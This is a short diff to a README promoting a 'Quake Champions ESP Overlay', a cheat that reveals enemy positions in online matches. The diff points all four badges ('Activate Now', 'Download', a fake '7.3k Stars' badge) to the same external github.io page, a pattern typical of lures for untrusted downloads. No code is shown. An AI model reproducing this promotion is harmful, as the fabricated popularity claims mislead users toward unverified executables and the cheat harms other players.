@@ -2,10 +2,10 @@
 
 The **Quake Champions ESP Overlay Software** gives players the tactical edge needed to thrive in chaotic arenas. By highlighting enemies, teammates, and valuable pickups in real time, this tool helps you **analyze duels, optimize routes, and refine map control**.
 
-[![Activate Now](https://img.shields.io/badge/Activate%20Now-purple?style=for-the-badge\&logo=rocket)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](#)
-[![⭐️ 7.3k Stars](https://img.shields.io/badge/⭐️%207.3k-Stars-yellow?style=for-the-badge\&logo=github)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-green?style=for-the-badge\&logo=github)](#)
+[![Activate Now](https://img.shields.io/badge/Activate%20Now-purple?style=for-the-badge\&logo=rocket)](https://quake-champions-esp.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](https://quake-champions-esp.github.io/.github/)
+[![⭐️ 7.3k Stars](https://img.shields.io/badge/⭐️%207.3k-Stars-yellow?style=for-the-badge\&logo=github)](https://quake-champions-esp.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-green?style=for-the-badge\&logo=github)](https://quake-champions-esp.github.io/.github/)
 
 ---
 
